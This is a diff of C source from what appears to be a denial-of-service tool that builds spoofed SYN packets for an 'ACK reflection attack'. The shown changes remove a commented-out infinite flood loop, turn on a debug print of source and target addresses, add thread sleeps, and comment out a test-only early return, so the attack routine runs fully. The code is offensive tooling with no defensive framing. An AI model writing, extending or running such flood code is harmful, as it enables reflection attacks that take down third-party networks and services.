@@ -155,9 +155,6 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
         return 1;
     }
 
-    // Uncommend the loop if you want to flood :)
-    //while (1)
-    //{
     //Send the packet
     for (i = 0; i < ss->each_ip_repeat; i++)
     {
@@ -173,14 +170,9 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
             DisplayError("Attack send failed");
             //break;
         }
-        // Data send successfull
-        /*
-        else
-        {
-            debug(debug_level, 2, "Attack packet end successful");
-        }
-        */
     }
+    // for test
+    //sleep(1);
 
     return 0;
 }
@@ -258,7 +250,7 @@ static int AttackThread(pSYNStruct syn_struct)
         FreeSplitURLBuff(split_result);
 
         // for test
-        //DisplayWarning("src address: %s - src port: %d - dst address: %s - dst port: %d", syn_struct->src_ip, syn_struct->src_port, syn_struct->dst_ip, syn_struct->dst_port);
+        DisplayWarning("src address: %s - src port: %d - dst address: %s - dst port: %d", syn_struct->src_ip, syn_struct->src_port, syn_struct->dst_ip, syn_struct->dst_port);
 
         for (i = 0; i < syn_struct->each_ip_repeat; i++)
         {
@@ -492,7 +484,8 @@ int StartACKReflectAttack(const pInput input)
                 }
                 pthread_attr_destroy(&attr);
                 // for the test
-                //sleep(2);
+                // also for the each thread ready
+                sleep(1);
             }
             //pthread_detach(tid);
             // join them all
@@ -501,7 +494,7 @@ int StartACKReflectAttack(const pInput input)
                 pthread_join(tid[j], NULL);
             }
             // exit for test
-            return 0;
+            //return 0;
         }
         // many process: actually this is not neccessary
         else
